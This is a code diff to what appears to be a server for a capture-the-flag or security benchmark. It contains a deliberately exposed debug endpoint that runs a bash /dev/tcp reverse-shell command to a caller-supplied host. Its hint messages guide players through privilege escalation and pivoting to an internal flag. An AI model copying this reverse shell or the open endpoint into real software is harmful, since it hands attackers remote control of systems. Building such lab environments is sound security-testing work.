@@ -280,7 +280,7 @@ function registerContainer(app, ctx) {
         challenge: ctx.mode,
         unlocked: 'edge-reverse-shell-callback',
         stageToken,
-        message: `Container socket signal confirmed. POST ${ctx.mode}/debug with X-Stage-Token and JSON {"host":"host.docker.internal","port":LISTENER_PORT}. Continue from the shell, escalate to read ${artifacts.keyPath}, then pivot to ${artifacts.pivotHost}:${artifacts.pivotPort}.`,
+        message: `Container socket signal confirmed. POST ${ctx.mode}/debug with X-Stage-Token and JSON {"host":"${callbackHostHint()}","port":LISTENER_PORT}. Continue from the shell, escalate to read ${artifacts.keyPath}, then pivot to ${artifacts.pivotHost}:${artifacts.pivotPort}.`,
         evidence: { vector: 'container-pivot-chain' }
       });
     }
@@ -477,7 +477,7 @@ function lockPivotSilverArtifacts(ctx) {
       'Edge foothold confirmed.',
       `Internal-only relay: http://${pivotHost}:${pivotPort}/`,
       `Auth header: X-Pivot-Key from ${keyPath}`,
-      'POST {"host":"host.docker.internal","port":LISTENER_PORT} to /callback to receive a second reverse shell.',
+      `POST {"host":"${callbackHostHint()}","port":LISTENER_PORT} to /callback to receive a second reverse shell.`,
       'The benchmark flag lives on the pivot relay host, not on this edge host.'
     ].join('\n') + '\n',
     { mode: 0o600 }
@@ -519,7 +519,7 @@ function lockHardPivotArtifacts(ctx, label) {
         `Auth header: X-Pivot-Key from ${keyPath}`,
         'The HTTP endpoint only triggers a reverse shell callback.',
         'Use the edge shell plus sudo/find privilege escalation to recover the relay key.',
-        'POST {"host":"host.docker.internal","port":LISTENER_PORT} to /callback from the edge shell to receive the pivot shell.',
+        `POST {"host":"${callbackHostHint()}","port":LISTENER_PORT} to /callback from the edge shell to receive the pivot shell.`,
         'The final benchmark flag lives on the relay host.'
       ].join('\n') + '\n',
       { mode: 0o600 }
@@ -551,6 +551,15 @@ function callbackPort(value) {
   return port;
 }
 
+function callbackHostHint() {
+  const hint = process.env.CALLBACK_HOST_HINT || 'NODE_HOST_IP';
+  return callbackHostOk(hint) ? hint : 'NODE_HOST_IP';
+}
+
+function reverseShellLaunchCommand(host, port) {
+  return `nohup bash -lc 'exec bash -i >& /dev/tcp/${host}/${port} 0>&1' >/dev/null 2>&1 </dev/null &`;
+}
+
 function registerCallbackOnlyEndpoint(app, ctx, label, tokenProvider) {
   app.post(`${ctx.mode}/debug`, (req, res) => {
     const token = req.headers['x-debug-token'] || req.headers['x-stage-token'];
@@ -565,7 +574,7 @@ function registerCallbackOnlyEndpoint(app, ctx, label, tokenProvider) {
       return res.status(400).json({ error: 'host and port are required for the reverse shell callback' });
     }
 
-    const command = `setsid bash -lc 'exec bash -i >& /dev/tcp/${host}/${port} 0>&1' </dev/null >/dev/null 2>&1 & disown`;
+    const command = reverseShellLaunchCommand(host, port);
     console.log(`[${label}-silver] triggering edge reverse shell callback to ${host}:${port}`);
     exec(command, { shell: '/bin/sh', timeout: 15000 }, (error) => {
       if (error) console.log(`[${label}-silver] edge callback launch failed: ${error.message}`);
@@ -598,7 +607,7 @@ function lockChainSilverArtifacts(ctx) {
       `Auth header: X-Pivot-Key from ${keyPath}`,
       'The HTTP debug endpoint cannot run arbitrary commands or return command output.',
       'Use the edge shell plus local sudo/find privilege escalation to recover the relay key.',
-      'POST {"host":"host.docker.internal","port":LISTENER_PORT} to /callback from the edge host to receive the pivot shell.',
+      `POST {"host":"${callbackHostHint()}","port":LISTENER_PORT} to /callback from the edge host to receive the pivot shell.`,
       'The final benchmark flag lives on the relay host.'
     ].join('\n') + '\n',
     { mode: 0o600 }
@@ -721,7 +730,7 @@ function registerPivot(app, ctx) {
         success: true,
         challenge: ctx.mode,
         unlocked: 'edge-reverse-shell-callback',
-        message: `Token accepted. POST ${ctx.mode}/debug with header X-Debug-Token: <token> and JSON {"host":"host.docker.internal","port":LISTENER_PORT}. Continue from the shell, escalate to read the relay key, then pivot internally for the final flag.`,
+        message: `Token accepted. POST ${ctx.mode}/debug with header X-Debug-Token: <token> and JSON {"host":"${callbackHostHint()}","port":LISTENER_PORT}. Continue from the shell, escalate to read the relay key, then pivot internally for the final flag.`,
         evidence: { vector: 'pivot-silver-reversing-rce-pivot', artifact: `${ctx.mode}/artifact.js` }
       });
     }
@@ -772,7 +781,7 @@ function registerChain(app, ctx) {
       return res.status(400).json({ error: 'host and port are required for the reverse shell callback' });
     }
 
-    const command = `setsid bash -lc 'exec bash -i >& /dev/tcp/${host}/${port} 0>&1' </dev/null >/dev/null 2>&1 & disown`;
+    const command = reverseShellLaunchCommand(host, port);
     console.log(`[chain-silver] triggering edge reverse shell callback to ${host}:${port}`);
     exec(command, { shell: '/bin/sh', timeout: 15000 }, (error) => {
       if (error) console.log(`[chain-silver] edge callback launch failed: ${error.message}`);
@@ -794,7 +803,7 @@ function registerChain(app, ctx) {
         success: true,
         challenge: ctx.mode,
         unlocked: 'edge-reverse-shell-callback',
-        message: `Token accepted. POST ${ctx.mode}/debug with header X-Debug-Token: <token> and JSON {"host":"host.docker.internal","port":LISTENER_PORT}. You must continue from the shell and pivot internally for the flag.`,
+        message: `Token accepted. POST ${ctx.mode}/debug with header X-Debug-Token: <token> and JSON {"host":"${callbackHostHint()}","port":LISTENER_PORT}. You must continue from the shell and pivot internally for the flag.`,
         evidence: { vector: 'chain-silver-reversing-revshell-privesc-pivot', artifact: `${ctx.mode}/artifact.js` }
       });
     }
@@ -823,7 +832,7 @@ function registerWebshell(app, ctx) {
         challenge: ctx.mode,
         unlocked: 'edge-reverse-shell-callback',
         stageToken,
-        message: `Webshell primitive confirmed. POST ${ctx.mode}/debug with X-Stage-Token and JSON {"host":"host.docker.internal","port":LISTENER_PORT}. Continue from the shell, escalate to read ${artifacts.keyPath}, then pivot to ${artifacts.pivotHost}:${artifacts.pivotPort}.`,
+        message: `Webshell primitive confirmed. POST ${ctx.mode}/debug with X-Stage-Token and JSON {"host":"${callbackHostHint()}","port":LISTENER_PORT}. Continue from the shell, escalate to read ${artifacts.keyPath}, then pivot to ${artifacts.pivotHost}:${artifacts.pivotPort}.`,
         evidence: { vector: 'webshell-pivot-chain' }
       });
     }
@@ -848,7 +857,7 @@ function registerPersist(app, ctx) {
         challenge: ctx.mode,
         unlocked: 'edge-reverse-shell-callback',
         stageToken,
-        message: `Persistence primitive confirmed. POST ${ctx.mode}/debug with X-Stage-Token and JSON {"host":"host.docker.internal","port":LISTENER_PORT}. Continue from the shell, escalate to read ${artifacts.keyPath}, then pivot to ${artifacts.pivotHost}:${artifacts.pivotPort}.`,
+        message: `Persistence primitive confirmed. POST ${ctx.mode}/debug with X-Stage-Token and JSON {"host":"${callbackHostHint()}","port":LISTENER_PORT}. Continue from the shell, escalate to read ${artifacts.keyPath}, then pivot to ${artifacts.pivotHost}:${artifacts.pivotPort}.`,
         evidence: { vector: 'persist-pivot-chain' }
       });
     }
